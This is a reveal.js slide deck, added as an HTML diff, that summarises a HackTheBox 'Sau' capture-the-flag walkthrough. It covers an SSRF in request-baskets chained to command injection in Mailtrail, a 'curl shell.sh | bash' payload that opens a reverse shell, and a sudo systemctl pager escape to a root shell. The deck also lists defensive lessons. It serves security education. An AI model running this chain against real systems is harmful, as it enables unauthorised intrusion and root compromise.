@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>Sau</title>
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/reveal.js@5/dist/reveal.css">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/reveal.js@5/dist/theme/black.css">
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600&family=Inter:wght@400;600&display=swap" rel="stylesheet">
+  <style>
+    .reveal { font-family: 'Inter', sans-serif; }
+    .reveal h1,.reveal h2 { font-family: 'JetBrains Mono', monospace; text-transform: none; margin-bottom: 0.3em; }
+    .reveal ul { list-style: none; padding: 0; margin: 0; width: 100%; }
+    .reveal ul li { word-wrap: break-word; overflow-wrap: break-word; white-space: normal; max-width: 100%; padding: 4px 0; }
+    .reveal ul li::before { content: "›  "; color: #58a6ff; font-weight: bold; }
+    .reveal section { text-align: left; padding: 20px 40px; box-sizing: border-box; }
+  </style>
+</head>
+<body>
+<div class="reveal">
+  <div class="slides">
+    
+    <section data-background="#0d1117">
+      <h1 style="color:#58a6ff;font-family:'JetBrains Mono',monospace;font-size:1.8em">Sau</h1>
+      <p style="color:#8b949e;margin-top:16px">Technical Deep-Dive</p>
+    </section>
+    
+    <section data-background="#0d1117">
+      <h2 style="color:#58a6ff">🖥️ Overview — Sau</h2>
+      <ul style="color:#e6edf3;font-size:0.82em;line-height:1.5"><li>Platform: HackTheBox | Difficulty: Easy | OS: Linux</li><li>Tags: SSRF, RCE, Privilege Escalation, Web</li><li>Kill chain: SSRF → Command Injection → Sudo misconfiguration</li><li>Goal: obtain user.txt + root.txt</li></ul>
+    </section>
+
+    <section data-background="#0d1117">
+      <h2 style="color:#58a6ff">🔍 Recon & Enumeration</h2>
+      <ul style="color:#e6edf3;font-size:0.82em;line-height:1.5"><li>Nmap full port scan (-sC -sV -p-): 3 ports identified</li><li>Port 22: OpenSSH 8.2p1 — no direct attack vector</li><li>Port 80: filtered — HTTP service only reachable internally (localhost-bound or firewall)</li><li>Port 55555: Golang HTTP server — request-baskets v1.2.1 identified</li><li>request-baskets version linked to CVE-2023-27163 (SSRF)</li></ul>
+    </section>
+
+    <section data-background="#0d1117">
+      <h2 style="color:#58a6ff">🚪 Initial Access</h2>
+      <ul style="color:#e6edf3;font-size:0.82em;line-height:1.5"><li>SSRF via request-baskets (CVE-2023-27163): basket created with forward_url=http://127.0.0.1:80 and proxy_response=true</li><li>Filtered port 80 exposed → internal app: Mailtrail v0.53</li><li>Mailtrail v0.53: unauthenticated OS command injection in 'username' parameter of /login</li><li>Payload: curl shell.sh | bash triggered via SSRF basket endpoint</li><li>Result: reverse shell as user 'puma' → user.txt obtained</li></ul>
+    </section>
+
+    <section data-background="#0d1117">
+      <h2 style="color:#58a6ff">⬆️ Privilege Escalation</h2>
+      <ul style="color:#e6edf3;font-size:0.82em;line-height:1.5"><li>sudo -l reveals: (ALL:ALL) NOPASSWD: /usr/bin/systemctl status trail.service</li><li>systemctl status invokes pager (less) on long output — runs as root via sudo</li><li>Inside less pager: !sh spawns a root shell</li><li>Technique documented on GTFOBins — systemctl</li><li>Result: root shell → root.txt obtained</li></ul>
+    </section>
+
+    <section data-background="#0d1117">
+      <h2 style="color:#58a6ff">🛠️ Tools & Techniques</h2>
+      <ul style="color:#e6edf3;font-size:0.82em;line-height:1.5"><li>Nmap (-sC -sV -p-): full port and service discovery</li><li>cURL: SSRF basket configuration + command injection trigger</li><li>Python3 http.server: payload hosting (shell.sh)</li><li>Netcat (nc -lvnp): reverse shell listener on port 9001</li><li>GTFOBins: reference for sudo/systemctl pager escape (!sh in less)</li></ul>
+    </section>
+
+    <section data-background="#0d1117">
+      <h2 style="color:#58a6ff">🎓 Lessons Learned</h2>
+      <ul style="color:#e6edf3;font-size:0.82em;line-height:1.5"><li>SSRF as a gateway: network filtering is insufficient when an SSRF vector exists on the same host</li><li>Patch third-party components: request-baskets v1.2.1 and Mailtrail v0.53 had public CVEs with exploit code</li><li>Sudo + pagers = danger: systemctl status implicitly grants root shell via less; mitigate with LESSSECURE=1 or cat</li><li>Defense in depth: the attack chains 3 weaknesses — mitigating any single link breaks the kill chain</li><li>Least-privilege: analyse transitive capabilities of every subprocess in sudo policies</li></ul>
+    </section>
+    
+    <section data-background="#0d1117">
+      <h2 style="color:#58a6ff">🏁 Done</h2>
+      <p style="color:#8b949e">cyberstefan.nl</p>
+    </section>
+    
+  </div>
+</div>
+<script src="https://cdn.jsdelivr.net/npm/reveal.js@5/dist/reveal.js"></script>
+<script>Reveal.initialize({ hash: true, transition: 'slide', backgroundTransition: 'fade', center: false, width: '100%', height: '100%', margin: 0.05, minScale: 0.1, maxScale: 1.5 });</script>
+</body>
+</html>
